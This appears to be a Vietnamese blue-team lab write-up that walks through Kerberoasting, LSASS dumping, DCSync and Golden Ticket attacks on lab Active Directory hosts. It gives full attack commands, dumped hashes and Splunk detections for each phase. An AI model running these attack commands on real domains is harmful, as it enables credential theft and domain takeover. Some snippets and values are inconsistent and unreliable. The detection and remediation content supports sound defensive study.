---
title: Active Directory Attack & Detection Lab
tags: [Active-Directory, Kerberos, Kerberoasting, DCSync, Golden-Ticket, Splunk, Threat-Hunting, Blue-Team]
tools: [Windows Server 2019, Kali Linux, Nmap, Impacket, hashcat, Sysmon, Splunk]
role: Blue Team / Detection Engineering
---

# Active Directory Attack & Detection Lab
https://www.thehacker.recipes/

## Kerberoasting → Credential Access → DCSync → Golden Ticket

---

## 1. Mục tiêu và attack chain

```text
Baseline → Logging → Recon → Kerberoasting → Service-account access
         → LSASS/credential access → DCSync → KRBTGT exposure → Golden Ticket
```


---

## 2. Kiến trúc lab

| Máy | IP | Vai trò |
|---|---:|---|
| DC01 | `10.10.10.134` | AD DS, DNS, KDC, Security log |
| WS01 | `10.10.10.132` | Domain workstation, Sysmon, endpoint bị mô phỏng compromise |
| Kali | `10.10.10.136` | Máy mô phỏng attacker; không cần join domain |

Domain: `lab.local` · NetBIOS: `LAB` · Network: `10.10.10.0/24`

Xác minh domain (chạy trên DC01 hoặc máy đã join):

```cmd
nltest /dsgetdc:lab.local
```

```text
Kali (10.10.10.136) ─── WS01 (10.10.10.132)
          └──────────── DC01 (10.10.10.134)
```



## 3. Dựng Domain Controller

Trên DC01 (PowerShell chạy bằng Administrator):

```powershell
Rename-Computer -NewName "DC01" -Restart
```

Sau reboot, cấu hình IP/DNS theo hypervisor rồi cài AD DS:

```powershell
Install-WindowsFeature AD-Domain-Services -IncludeManagementTools
Install-ADDSForest `
  -DomainName "lab.local" `
  -DomainNetbiosName "LAB" `
  -InstallDNS `
  -Force
```


Kiểm tra sau reboot:

```powershell
Get-ADDomain
Get-ADDomainController
Resolve-DnsName lab.local
ipconfig /all
```
![alt text](../images/image-1.png)

Tạo OU và các tài khoản lab:

```powershell
New-ADOrganizationalUnit -Name "LabUsers" -Path "DC=lab,DC=local"
$pwUser = ConvertTo-SecureString "LabUser@2026!" -AsPlainText -Force
$pwSvc  = ConvertTo-SecureString "ServiceLab@2026!" -AsPlainText -Force
$pwAdm  = ConvertTo-SecureString "AdminLab@2026!" -AsPlainText -Force

New-ADUser user01 -SamAccountName user01 -UserPrincipalName user01@lab.local `
  -AccountPassword $pwUser -Enabled $true -Path "OU=LabUsers,DC=lab,DC=local"
New-ADUser svc_web -SamAccountName svc_web -UserPrincipalName svc_web@lab.local `
  -AccountPassword $pwSvc -Enabled $true -PasswordNeverExpires $true `
  -Path "OU=LabUsers,DC=lab,DC=local"
New-ADUser admin01 -SamAccountName admin01 -UserPrincipalName admin01@lab.local `
  -AccountPassword $pwAdm -Enabled $true -Path "OU=LabUsers,DC=lab,DC=local"
Add-ADGroupMember "Domain Admins" admin01
Get-ADUser -Filter * -Properties ServicePrincipalName | Format-Table SamAccountName,Enabled
```

---

## 4. Join WS01 và tạo SPN

Trên WS01:

```powershell
Rename-Computer -NewName "WS01" -Restart
Set-DnsClientServerAddress -InterfaceAlias "Ethernet" -ServerAddresses 10.10.10.132
Resolve-DnsName lab.local
Add-Computer -DomainName "lab.local" -Credential (Get-Credential) -Restart
```

Đăng nhập `LAB\user01`, rồi trên DC01 tạo SPN cho service account:

```cmd
setspn -S HTTP/ws01.lab.local lab\svc_web
setspn -L LAB\svc_web
setspn -Q HTTP/ws01.lab.local
```

Trên WS01, tạo quyền local có chủ ý:

```powershell
Add-LocalGroupMember -Group "Administrators" -Member "LAB\svc_web"
Get-LocalGroupMember Administrators
```
![alt text](../images/image-2.png)

Kiểm tra Kerberos:

```cmd
whoami
klist purge
klist
w32tm /query /status
```

---

## 5. Logging và telemetry

### 5.1 Windows Audit Policy

Trên DC01:

```cmd
auditpol /set /subcategory:"Kerberos Authentication Service" /success:enable /failure:enable
auditpol /set /subcategory:"Kerberos Service Ticket Operations" /success:enable /failure:enable
auditpol /set /subcategory:"Logon" /success:enable /failure:enable
auditpol /set /subcategory:"Special Logon" /success:enable
auditpol /set /subcategory:"Credential Validation" /success:enable /failure:enable
auditpol /set /subcategory:"Process Creation" /success:enable
auditpol /set /subcategory:"Directory Service Access" /success:enable /failure:enable
auditpol /get /category:*
```

Bật command line cho Event 4688 bằng Group Policy:  
`Computer Configuration → Administrative Templates → System → Audit Process Creation → Include command line...`

### 5.2 Sysmon trên WS01

```cmd
Sysmon64.exe -accepteula -i
sc query Sysmon64
```



## 6. Phase 1 — Recon và enumeration

Từ Kali:

```bash
ip addr
ping -c 3 10.10.10.134
ping -c 3 10.10.10.132
nslookup lab.local 10.10.10.134
nmap -sT -p 53,88,135,139,389,445,464,636,3268,3389 10.10.10.134
nmap -sT -p 135,139,445,3389 10.10.10.132
```

```
┌──(kali㉿kali)-[~]
└─$ nmap -sT -p 53,88,135,139,389,445,464,636,3268,3389 10.10.10.134

Starting Nmap 7.99 ( https://nmap.org ) at 2026-09-22 05:35 -0400
Stats: 0:00:00 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan
Connect Scan Timing: About 95.00% done; ETC: 05:35 (0:00:00 remaining)
Nmap scan report for 10.10.10.134
Host is up (0.0031s latency).

PORT     STATE    SERVICE
53/tcp   open     domain
88/tcp   open     kerberos-sec
135/tcp  open     msrpc
139/tcp  open     netbios-ssn
389/tcp  open     ldap
445/tcp  open     microsoft-ds
464/tcp  open     kpasswd5
636/tcp  open     ldapssl
3268/tcp open     globalcatLDAP
3389/tcp filtered ms-wbt-server
MAC Address: 00:0C:29:81:75:E2 (VMware)

Nmap done: 1 IP address (1 host up) scanned in 1.86 seconds
                                                                             
┌──(kali㉿kali)-[~]
└─$ nmap -sT -p 135,139,445,3389 10.10.10.132

Starting Nmap 7.99 ( https://nmap.org ) at 2026-09-22 05:38 -0400
Nmap scan report for 10.10.10.132
Host is up (0.0037s latency).

PORT     STATE  SERVICE
135/tcp  open   msrpc
139/tcp  open   netbios-ssn
445/tcp  open   microsoft-ds
3389/tcp open   ms-wbt-server
MAC Address: 00:0C:29:FA:2D:11 (VMware)

Nmap done: 1 IP address (1 host up) scanned in 0.62 seconds
```

LDAP query với user lab:

```bash
ldapsearch -x -H ldap://10.10.10.134 \
  -D 'user01@lab.local' -W -b 'DC=lab,DC=local' \
  '(&(objectCategory=person)(objectClass=user))' sAMAccountName

ldapsearch -x -H ldap://10.10.10.134 \
  -D 'user01@lab.local' -W -b 'DC=lab,DC=local' \
  '(&(objectClass=user)(servicePrincipalName=*))' \
  sAMAccountName servicePrincipalName
```
                                                                                         

```
┌──(kali㉿kali)-[~]
└─$ ldapsearch -x -H ldap://10.10.10.134 \     
  -D 'user01@lab.local' -W -b 'DC=lab,DC=local' \
  '(&(objectClass=user)(servicePrincipalName=*))' \
  sAMAccountName servicePrincipalName
Enter LDAP Password: 
# extended LDIF
#
# LDAPv3
# base <DC=lab,DC=local> with scope subtree
# filter: (&(objectClass=user)(servicePrincipalName=*))
# requesting: sAMAccountName servicePrincipalName 
#

# DC01, Domain Controllers, lab.local
dn: CN=DC01,OU=Domain Controllers,DC=lab,DC=local
sAMAccountName: DC01$
servicePrincipalName: Dfsr-12F9A27C-BF97-4787-9364-D31B6C55EB04/DC01.lab.local
servicePrincipalName: ldap/DC01.lab.local/ForestDnsZones.lab.local
servicePrincipalName: ldap/DC01.lab.local/DomainDnsZones.lab.local
servicePrincipalName: DNS/DC01.lab.local
servicePrincipalName: GC/DC01.lab.local/lab.local
servicePrincipalName: RestrictedKrbHost/DC01.lab.local
servicePrincipalName: RestrictedKrbHost/DC01
servicePrincipalName: RPC/fffd739e-c0d3-40b6-9039-1681c8e0056f._msdcs.lab.loca
 l
servicePrincipalName: HOST/DC01/LAB
servicePrincipalName: HOST/DC01.lab.local/LAB
servicePrincipalName: HOST/DC01
servicePrincipalName: HOST/DC01.lab.local
servicePrincipalName: HOST/DC01.lab.local/lab.local
servicePrincipalName: E3514235-4B06-11D1-AB04-00C04FC2DCD2/fffd739e-c0d3-40b6-
 9039-1681c8e0056f/lab.local
servicePrincipalName: ldap/DC01/LAB
servicePrincipalName: ldap/fffd739e-c0d3-40b6-9039-1681c8e0056f._msdcs.lab.loc
 al
servicePrincipalName: ldap/DC01.lab.local/LAB
servicePrincipalName: ldap/DC01
servicePrincipalName: ldap/DC01.lab.local
servicePrincipalName: ldap/DC01.lab.local/lab.local

# krbtgt, Users, lab.local
dn: CN=krbtgt,CN=Users,DC=lab,DC=local
sAMAccountName: krbtgt
servicePrincipalName: kadmin/changepw

# DESKTOP-N1856ET, Computers, lab.local
dn: CN=DESKTOP-N1856ET,CN=Computers,DC=lab,DC=local
sAMAccountName: DESKTOP-N1856ET$
servicePrincipalName: WSMAN/DESKTOP-N1856ET
servicePrincipalName: WSMAN/DESKTOP-N1856ET.lab.local
servicePrincipalName: RestrictedKrbHost/DESKTOP-N1856ET
servicePrincipalName: HOST/DESKTOP-N1856ET
servicePrincipalName: RestrictedKrbHost/DESKTOP-N1856ET.lab.local
servicePrincipalName: HOST/DESKTOP-N1856ET.lab.local

# WS01, Computers, lab.local
dn: CN=WS01,CN=Computers,DC=lab,DC=local
sAMAccountName: WS01$
servicePrincipalName: WSMAN/ws01.lab.local
servicePrincipalName: TERMSRV/ws01.lab.local
servicePrincipalName: RestrictedKrbHost/ws01.lab.local
servicePrincipalName: HOST/ws01.lab.local
servicePrincipalName: WSMAN/WS01
servicePrincipalName: TERMSRV/WS01
servicePrincipalName: RestrictedKrbHost/WS01
servicePrincipalName: HOST/WS01

# svc_web, LabUsers, lab.local
dn: CN=svc_web,OU=LabUsers,DC=lab,DC=local
sAMAccountName: svc_web
servicePrincipalName: HTTP/ws01.lab.local
servicePrincipalName: HTTP/web.lab.local

# search reference
ref: ldap://ForestDnsZones.lab.local/DC=ForestDnsZones,DC=lab,DC=local

# search reference
ref: ldap://DomainDnsZones.lab.local/DC=DomainDnsZones,DC=lab,DC=local

# search reference
ref: ldap://lab.local/CN=Configuration,DC=lab,DC=local

# search result
search: 2
result: 0 Success

# numResponses: 9
# numEntries: 5
# numReferences: 3

```
LDAP Enumeration: lợi dụng tài khoản user01 để kết nối LDAP của DC01, tìm trong AD tất cả các user SPN





## 7. Phase 2 — Kerberoasting

Cài công cụ trong Kali lab:

```bash
sudo apt update
sudo apt install -y impacket-scripts
which impacket-GetUserSPNs
```

Liệt kê và yêu cầu TGS cho SPN:

Chạy GetUserSPNs để LDAP Enum SPN gắn gới user01 

```bash
impacket-GetUserSPNs 'LAB.LOCAL/user01:LabUser@2026!' \
  -dc-ip 10.10.10.134
```
![alt text](../images/image-3.png)

Thực hiện tạo request => sinh ra event log 4769 trên DC
```
impacket-GetUserSPNs 'LAB.LOCAL/user01:LabUser@2026!' \
  -dc-ip 10.10.10.134 -request -outputfile kerberoast.txt
cat kerberoast.txt
```
![alt text](../images/image-4.png)

$krb5tgs$23$*svc_web$LAB.LOCAL$HTTP/ws01.lab.local*...

   


Trên DC xem Event 4769:

```powershell
Get-WinEvent -FilterHashtable @{LogName="Security"; Id=4769} -MaxEvents 50 |
  Select-Object TimeCreated,Message
```

![alt text](../images/image-5.png)


### Detection

```spl
index=main EventCode=4769 Failure_Code=0x0
| where NOT match(Account_Name, "\$@")
| where Service_Name!="krbtgt"
| where NOT match(Service_Name, "\$$")
| table _time host Account_Name Client_Address Client_Port Service_Name Ticket_Encryption_Type Ticket_Options Failure_Code
| sort - _time
```

### False positive

**Không coi `0x17` là IOC tuyệt đối.** RC4 có thể xuất hiện do ứng dụng legacy, trust cũ, thiết bị không hỗ trợ AES, hoặc SPN được cấu hình lâu năm.

1. Baseline 7–14 ngày theo `requesting account + source host + ServiceName + etype`.
2. Loại trừ có kiểm soát các tài khoản máy (`*$`), `krbtgt`, và service account đã được chủ hệ thống xác nhận.
3. Tăng điểm rủi ro khi có đồng thời: nhiều SPN trong vài phút, source không quen thuộc, RC4, account thường không request SPN, và process enumeration.



---

## 8. Phase 3 — Service-account access và lateral movement
Sau khi có hash của TGS svc_web, thực hiện hiện crack offline bằng jonandripper hoặc hashcat 
Sử dụng module 13100 của hashcat
```bash
hashcat -m 13100 -a 0 kerberoast.hash /usr/share/wordlists/rockyou.txt
```
![alt text](../images/image-6.png)

Trong lab, xác nhận `svc_web` có local admin trên WS01 rồi kiểm tra đăng nhập từ nguồn đã định:

![alt text](../images/image-7.png)

![alt text](../images/image-8.png)

![alt text](../images/image-9.png)

Trên WS01, truy vấn các log liên quan:

```powershell
Get-WinEvent -FilterHashtable @{LogName="Security"; Id=4624,4648,4672,4776} -MaxEvents 100 |
  Select-Object TimeCreated,Id,Message
```

### Detection

```spl
index=wineventlog EventCode=4624 Logon_Type=3
| stats count values(src_ip) as source_ips by TargetUserName, dest, Authentication_Package_Name
```
![alt text](../images/image-10.png)
```spl
index=wineventlog EventCode=4672
| search TargetUserName IN ("svc_web","admin01")
| stats count by TargetUserName, src_ip, dest
```

![alt text](../images/image-11.png)

### False positive và tuning

- `4624 Logon_Type=3` là bình thường cho SMB, service, scheduled task và management tools.
- `4672` có thể là admin vận hành hợp lệ, backup agent hoặc monitoring.
- `4648` có thể do deployment dùng explicit credential.

Tuning bằng allowlist có cấu trúc: `account + source host + destination + process + maintenance window`; không allowlist chỉ theo username. Alert khi service account đăng nhập workstation người dùng, xuất hiện ở host mới, ngoài giờ, hoặc ngay sau burst 4769.

---

## 9. Phase 4 — Credential access / LSASS (T1003.001)

Bối cảnh: sau Kerberoasting, crack offline TGS hash, attacker thu được plaintext password của svc_web — account local admin trên WS01. Do đó credential này được sử dụng trực tiếp để lateral movement vào WS01. Ta tiến hành dump LSASS trên **WS01** (không phải DC), rồi dùng credential tìm được để tiếp cận DC. Đây là bước mở rộng blast radius trước khi sang DCSync.

### 9.1 Thực thi: dump LSASS bằng Procdump từ xa

Từ Kali, dùng Impacket để chạy lệnh từ xa với hash (không cần plaintext):

```bash
impacket-wmiexec \
  'LAB.LOCAL/svc_web:ServiceLab@2026!@10.10.10.132'
```

> Trong lab này mật khẩu của service account là chuỗi đơn giản nên crack xong, ta dùng luôn


Trong shell mở ra trên WS01, chạy Procdump với quyền SYSTEM (do psexec tạo service):

```cmd
C:\Windows\System32\procdump64.exe -accepteula -ma lsass.exe C:\Windows\Temp\lsass.dmp
```
![alt text](../images/image-12.png)

“Hành vi truy cập LSASS nhằm thu thập credential đã bị Microsoft Defender phát hiện và thực hiện remediation trước khi lsass.dmp được tạo thành công.”

Giả thiết: trong trường hợp Window Defender bị hacker tắt, thực hiện dump lsass thành công

![alt text](../images/image-13.png)

Tải dump về Kali để phân tích offline:

```bash
smbclient //10.10.10.132/ADMIN$ -U 'LAB.LOCAL\svc_web%<plaintext>'
get lsass.dmp
```
![alt text](../images/image-14.png)

Phân tích dump trên Linux bằng `pypykatz`:

```bash
pypykatz lsa minidump lsass.dmp
```
![alt text](../images/image-15.png)

Kết quả mong đợi: bảng credential gồm `admin01`, `svc_web`, `DC01$` và các SYSTEM account,
kèm NTLM hash. Đây chính là bằng chứng LSASS đã bị truy cập.

![alt text](../images/image-17.png)

```
authentication_id 9357635 (8ec943)
session_id 2
username admin01
domainname LAB
logon_server DC01
logon_time 2026-09-30T14:40:56.907643+00:00
sid S-1-5-21-3652451122-3879682883-852968352-1110
luid 9357635
        == MSV ==
                Username: admin01
                Domain: LAB
                LM: NA
                NT: 3c31d0adfbed6425a9b962865075e047
                SHA1: 82b6560b0ed435afa8d057ac99c3ebff6c2ab112
                DPAPI: b89f3483f8ba1f83cf9ebbb3e0addf1f00000000
        == WDIGEST [8ec943]==
                username admin01
                domainname LAB
                password None
                password (hex)
        == Kerberos ==
                Username: admin01
                Domain: LAB.LOCAL
                AES128 Key: 3c31d0adfbed6425a9b962865075e047
                AES256 Key: 96a2efc0f81053ae7dfcfba289cd016d575b1b9d263968f049830f8284f176e7
        == WDIGEST [8ec943]==
                username admin01
                domainname LAB
                password None
                password (hex)
        == DPAPI [8ec943]==
                luid 9357635
                key_guid 6a1d8ff8-8f37-45c5-ae56-fab44d15acca
                masterkey 6f29757db21d12e9252b55f7f55762b62bcc9625012ffeb49e271dd25eef68ce6519db39690cb92e07a44af9ae463ffd7164ae74e5fc2780e83e722c5400b388
                sha1_masterkey 4dd43d07729f0a115f2a24f24335300ef694fdb6

```




### 9.2 Telemetry sinh ra

| Nguồn | Event | Nội dung |
|---|---|---|
| Sysmon WS01 | **10** (ProcessAccess) | process từ xa mở handle tới `lsass.exe` với quyền cao |
| Sysmon WS01 | **1** (ProcessCreate) | `procdump64.exe` với `-ma lsass.exe` |
| Sysmon WS01 | **11** (FileCreate) | tạo file `C:\Windows\Temp\lsass.dmp` |
| Security WS01 | **5145** (Detailed File Share) | đọc file qua ADMIN$ |
| DC01 | **4672** | service account được cấp quyền đặc biệt |
| DC01 | **4624** type 3 | `svc_web` đăng nhập từ `10.10.10.132` |



### 9.3 Detection


```spl [LSASS Dump Attempt]
index=main
sourcetype="WinEventLog:Microsoft-Windows-Sysmon/Operational"
EventCode=1
| where NOT match(Image, "(?i)\\\\lsass\.exe$")
| where match(
    CommandLine,
    "(?i)(procdump(?:64)?\.exe.*(?:-ma|-mm).*lsass\.exe|procdump(?:64)?\.exe.*lsass\.exe.*\.dmp|comsvcs\.dll.*(?:MiniDump|MiniDumpW)|rundll32\.exe.*comsvcs\.dll.*(?:MiniDump|MiniDumpW)|MiniDumpWriteDump.*lsass)"
)
| table _time host User Image CommandLine ParentImage ProcessId
| sort - _time
```
![alt text](../images/image-24.png)


```spl [Credential Dump File Created]
index=main
sourcetype="WinEventLog:Microsoft-Windows-Sysmon/Operational"
EventCode=11
| where match(
    TargetFilename,
    "(?i)(lsass|sam|security|ntds)\.dmp$"
)
| eval detection="Credential Dump File Created"
| table _time host User Image TargetFilename detection
| sort - _time
```
![alt text](../images/image-33.png)


Dấu hiệu **procdump** (đáng cảnh báo hơn mimikatz vì ít false positive):

```spl
index=main EventCode=1 Image="*\\procdump*.exe"
| table _time Computer User Image CommandLine ParentImage
```

### 9.4 False positive và tuning

Sysmon 10 có thể phát sinh từ Defender/EDR, AV, credential provider, backup, Task Manager,
crash dump và công cụ hỗ trợ hợp lệ. Tuning theo:

1. `SourceImage` đã ký số và đường dẫn chuẩn.
2. `GrantedAccess` (quyền cao đáng chú ý hơn quyền đọc thông thường).
3. User/parent process/command line.
4. Có file dump mới (Sysmon 11/EDR) hay không.


**Điểm quan trọng:** Event 10 một mình là yếu. Nhưng chuỗi
`procdump.exe -ma lsass.exe` → `lsass.dmp` xuất hiện → `psexec/wmiexec` từ xa là bằng chứng
đủ mạnh để mở incident, vì cả ba đều hiếm khi xảy ra tự nhiên trên một workstation.

### 9.5 Bước tiếp theo

Từ credential lấy được trong dump, ta dùng `admin01` để tiếp cận DC → **Phase 5 (DCSync)**.
Đây là bước nối quan trọng: dump trên WS01 đã dẫn tới quyền trên DC.

---

## 10. Phase 5 — DCSync (T1003.006, Event 4662)

Bối cảnh: từ LSASS dump ở Phase 4, ta đã có credential của `admin01` (Domain Admin).
Bước này dùng quyền đó để **replicate directory** — tức lấy hash của mọi account, bao gồm
`krbtgt` — mà không cần đăng nhập trực tiếp vào DC.

### 10.1 Cấu hình telemetry (bắt buộc trước khi chạy)

4662 chỉ sinh ra khi đối tượng có **SACL** (System Access Control List). Trên domain mới cài,
bạn cần bật audit ở đúng cấp:

```powershell
# Trên DC01
auditpol /set /subcategory:"Directory Service Access" /success:enable /failure:enable
auditpol /get /subcategory:"Directory Service Access"

# Đặt SACL lên domain object để 4662 có dữ liệu
$domainDN = "DC=lab,DC=local"
$acl = Get-Acl $domainDN
$acl.AddAccessRuleSpecific([System.Security.AccessControl.ActiveDirectoryRights]"ReadProperty",
  [System.Security.AccessControl.AccessControlType]::Allow)
Set-Acl $domainDN $acl
```

Sau khi bật, xác nhận bằng:

```powershell
Get-WinEvent -FilterHashtable @{LogName="Security"; Id=4662} -MaxEvents 100 |
  Select-Object TimeCreated,Message
```

Ba GUID replication cần theo dõi (đây là "extended right" được cấp quyền để DCSync):

| GUID | Ý nghĩa |
|---|---|
| `1131f6aa-9c07-11d1-f79f-00c04fc2dcd2` | **DS-Replication-Get-Changes** |
| `1131f6ad-9c07-11d1-f79f-00c04fc2dcd2` | **DS-Replication-Get-Changes-All** |
| `89e95b76-444d-4c62-991a-0facbeda640c` | **DS-Replication-In-Set** |

### 10.2 Thực thi: DCSync từ xa

Từ Kali, chạy `secretsdump` với quyền của `admin01` thực hiện DCSync req credential của krbtgt

```bash
impacket-secretsdump \
  -hashes ':3c31d0adfbed6425a9b962865075e047' \   → dùng NT hash của admin01, không cần plaintext
  'LAB.LOCAL/admin01@10.10.10.134' \
  -just-dc-user krbtgt  → chỉ yêu cầu credential của krbtgt
```
![alt text](../images/image-18.png)



### 10.3 Telemetry sinh ra

| Nguồn | Event | Nội dung |
|---|---|---|
| DC01 Security | **4662** | `admin01` request replication GUID từ `10.10.10.136` |
| DC01 Security | **4624** type 3 | logon mạng kèm theo |
| DC01 Security | **4672** | quyền đặc biệt |
| DC01 Security | **4742** | nếu sau đó có đổi mật khẩu domain |

impacket-ticketer \
  -nthash '83032e3d65ebec5737980ffa293d5d2b' \
  -domain-sid 'S-1-5-21-3652451122-3879682883-852968352' \
  -domain 'LAB.LOCAL' \
  admin01


### 10.4 Detection

```spl [Potential DCSync]
index=main EventCode=4662
| search Properties_GUID="*1131f6aa-9c07-11d1-f79f-00c04fc2dcd2*"
     OR Properties_GUID="*1131f6ad-9c07-11d1-f79f-00c04fc2dcd2*"
     OR Properties_GUID="*89e95b76-444d-4c62-991a-0facbeda640c*"
| where NOT match(Account_Name,"\\$$")
| eval detection="Potential DCSync"
| table _time ComputerName Account_Domain Account_Name Access_Mask Accesses Properties_GUID Object_Name detection Logon_ID
| sort - _time
```
![alt text](../images/image-29.png)

> Dựa vào Logon_ID để xác định ai thực hiện và từ IP/máy nào, sau đó pivot sang evnet 4624 để kiểm tra authentication. Sau DCSync, kiểm tra 4768/4769, 4624 để xác định attacker có lấy Kerberos ticket và thực hiện lateral movement hay không

![alt text](../images/image-32.png)



### 10.5  False positive và tuning

4662 rất noisy nếu SACL rộng. Các false positive hợp lệ gồm DC-to-DC replication, backup, identity sync, migration và health-check. Tạo baseline theo:

- Subject là computer account của DC hay user account.
- Source IP thuộc danh sách DC/identity infrastructure.
- Lịch replication/backup.
- Quyền replication thực sự được cấp cho account.

Alert mạnh khi replication GUID được request từ workstation/Kali hoặc user không thuộc allowlist, đặc biệt nếu có 4624 network logon từ cùng source. **Một 4662 ngoài DC không nên bị suppress vĩnh viễn**; đây là tín hiệu có thể đồng nghĩa toàn domain bị lộ.

---

## 11. Pass-the-Hash / Overpass / Pass-the-Ticket

Hunting PtH:

```spl
index=main EventCode=4624 Logon_Type=3
Authentication_Package_Name="NTLM" Logon_Process_Name="NtLmSsp"
| stats count by TargetUserName, SubjectUserSid, src_ip, dest
```

Hunting Overpass:

```spl
index=main EventCode=4768 Ticket_Encryption_Type=0x17
| stats count by TargetUserName, IpAddress
```

Hunting ticket sequence:

```spl
index=main (EventCode=4768 OR EventCode=4769 OR EventCode=4624)
| transaction TargetUserName maxspan=10m
| search EventCode=4769 NOT EventCode=4768
```

### False positive và tuning

- NTLM có thể hợp lệ với legacy app, NAS, workgroup device, printer và service không hỗ trợ Kerberos.
- RC4 4768 có thể do legacy encryption/trust.
- “4769 không thấy 4768” có thể do log loss, clock skew, DC khác, hoặc ticket cache hợp lệ; không kết luận Golden/Silver Ticket chỉ từ thiếu event.

Tuning bằng asset inventory, log completeness, DC correlation, source/destination pair và maintenance window. Chỉ nâng cao severity khi có nhiều tín hiệu: NTLM từ host mới + privileged account + SMB/WMI process + 4672.

---

## 12. Phase 6 — Golden Ticket (T1558.001)

Bối cảnh: ở Phase 5 đã lấy được NTLM hash của `krbtgt` thông qua DCSync. Với hash này, ta
có thể **tự tạo ticket TGT hoàn toàn offline** — không cần hỏi DC, không cần mật khẩu.
Đây là bước cho quyền truy cập toàn domain và khó phát hiện nhất trong chuỗi.

### 12.1 Thực thi: tạo Golden Ticket trên Kali

Cần 3 thông số: **krbtgt NTLM hash**, **domain SID**, **tên domain**.

Lấy domain SID (từ bất kỳ user nào, không cần quyền admin):

```bash
impacket-lookupsid 'LAB.LOCAL/user01:PLAIN_TEXT' -dc-ip 10.10.10.134
```

krbtgt:502:aad3b435b51404eeaad3b435b51404ee:83032e3d65ebec5737980ffa293d5d2b:::

Domain SID có thể lấy ngay từ SID của admin01 mà bạn đã thu được trong LSASS:

S-1-5-21-3652451122-3879682883-852968352-1110
                                  └──────────── domain SID

=> ĐỦ 3 YÊU CẦU ĐỂ THỰC HIỆN TẠO GOLDEN TICKET
KRBTGT NT hash  = 83032e3d65ebec5737980ffa293d5d2b
Domain          = LAB.LOCAL
Domain SID      = S-1-5-21-3652451122-3879682883-852968352

![alt text](../images/image-19.png)

Tạo ticket với Impacket:

```bash
impacket-ticketer \
  -nthash '83032e3d65ebec5737980ffa293d5d2b' \
  -domain-sid 'S-1-5-21-3652451122-3879682883-852968352' \
  -domain 'LAB.LOCAL' \
  admin01
```

File `.ccache` được tạo ra.  

![alt text](../images/image-20.png)


Nạp ticket vào Kerberos cache

```bash
export KRB5CCNAME=$PWD/admin01.ccache

klist #Kiểm tra
```
![alt text](../images/image-21.png)

Golden Ticket dùng Kerberos nên nên dùng hostname của DC thay vì IP.

```bash
echo '10.10.10.134 dc01.lab.local DC01' | sudo tee -a /etc/hosts
```
![alt text](../images/image-22.png)


Nếu muốn làm trực tiếp trên Windows (bằng Mimikatz):

```powershell
.\mimikatz.exe
privilege::debug
lsadump::sam
kerberos::golden /domain:lab.local /user:admin01 /rc4:<krbtgt_NTLM_hash> /sid:S-1-5-21-XXXXX-XXXXX-XXXXX
kerberos::ptt golden.kirbi
```

Dùng Golden Ticket để remote execution
```bash
impacket-psexec \
  -k -no-pass \
  'LAB.LOCAL/admin01@dc01.lab.local' \
  -dc-ip 10.10.10.134
```
-k        → dùng Kerberos credential cache
-no-pass  → không hỏi password
admin01   → principal trong ticket
dc01.lab.local → máy đích



> Golden Ticket được tạo offline bằng KRBTGT secret nên không có Event 4768 tương ứng với việc tạo TGT. Khi ticket được sử dụng, có thể xuất hiện 4769 và 4624 tùy luồng Kerberos/service access.


### 12.4 Detection

Golden Ticket được forge offline bằng KRBTGT hash nên quá trình forge không yêu cầu KDC cấp TGT, do đó không tạo ra Event 4768 tương ứng với thời điểm forge.

Khi Golden Ticket được sử dụng để truy cập một service Kerberos, có thể xuất hiện Event 4769 (TGS request), trong khi không tìm thấy 4768 tương ứng trong cùng khoảng thời gian.

Tuy nhiên, 4769 có nhưng 4768 không có chỉ là hunting indicator, không đủ để kết luận Golden Ticket. Có thể ticket đã được tạo/cached trước đó, request diễn ra trên DC khác, hoặc log 4768 không còn trong khoảng thời gian tìm kiếm.

Vì vậy cần kết hợp thêm source IP, username, Logon GUID/Logon ID và các hoạt động sau đó.

Detection: Remote Service Execution
Sau khi có Kerberos authentication, cần kiểm tra việc sử dụng quyền để thực hiện remote execution.

```bash 
index=main
(EventCode=4697 OR EventCode=7045) admin01
| table _time EventCode ComputerName
    Account_Name ServiceName
    Service_File_Name ImagePath
| sort _time
```

![alt text](../images/image-34.png)

```bash 
index=main
(EventCode=4697 OR EventCode=7045) 
| table _time EventCode ComputerName
    Account_Name ServiceName
    Service_File_Name ImagePath
| sort _time
```

![alt text](../images/image-35.png)


### 12.5 False positive và tuning

False positive chính: RC4 legacy, clock/timezone sai, event ingestion trễ, admin dùng jump host,
và ticket hợp lệ có lifetime do policy. Vì vậy cần kiểm tra ticket lifetime thực tế, host nguồn, account owner, DC đã ghi event, và tính toàn vẹn log trước khi kết luận.



**Điều kiện đủ để mở incident (không cần chờ thêm bằng chứng):**

1. `krbtgt` hash đã bị lộ qua DCSync (4662 từ nguồn không phải DC) **hoặc**
2. 4768 không kèm 4769 **và** tài khoản đó không có logon hợp lệ trong cùng khung thời gian.

Trước khi reset KRBTGT, phải chắc chắn log đủ tin cậy — vì nếu log rơi, bạn có thể bỏ sót
ticket đã được cấp mà không thấy 4768.

Nếu xác nhận KRBTGT compromise:

1. Cô lập host nguồn, bảo toàn log/forensic.
2. Reset password `krbtgt` lần 1.
3. Chờ replication hoàn tất trên mọi DC.
4. Reset lần 2 sau khi xác minh replication.
5. Reset các account/secret bị lộ, rà soát trust, service account và persistence.
6. Xác minh ticket cũ không còn được chấp nhận rồi mới khôi phục dịch vụ.

Vì sao reset **hai lần**: lần đầu chỉ thay đổi trên một DC. Nếu KDC cũ vẫn còn KRBTGT cũ
trong database, nó có thể cấp ticket hợp lệ bằng khóa cũ. Phải đợi replication đồng bộ rồi
mới reset lần hai trên toàn forest.

```powershell
# Lần 1
Set-ADAccountPassword -Identity krbtgt -Reset -NewPassword (Read-Host -AsSecureString)
# Xác minh replication đã đồng bộ
Get-ADDomainController -Filter * | ForEach-Object {
  Get-ADObject -Identity (Get-ADDomain).DistinguishedName -Server $_.Hostname -Properties msDS-ReplAttributeMetaData
}
# Lần 2
Set-ADAccountPassword -Identity krbtgt -Reset -NewPassword (Read-Host -AsSecureString)
```

---

## 13. Correlation rule đề xuất

```text
4769 burst/RC4
   + service account login trên host mới (4624)
   + privileged logon (4672)
   + LSASS access (Sysmon 10)
   + replication access (4662)
   + anomalous Kerberos use
→ một incident có mức độ tăng dần
```

Ví dụ SPL theo điểm rủi ro:

```spl
index=wineventlog OR index=sysmon
| eval signal=case(
    EventCode=4769 AND Ticket_Encryption_Type="0x17", "kerberos_rc4",
    EventCode=4624 AND Logon_Type=3 AND Authentication_Package_Name="NTLM", "ntlm_network",
    EventCode=4672, "special_privilege",
    EventCode=4662 AND Properties="*1131f6a*", "replication",
    EventCode=10 AND TargetImage="*\\lsass.exe", "lsass_access",
    true(), null())
| search signal=*
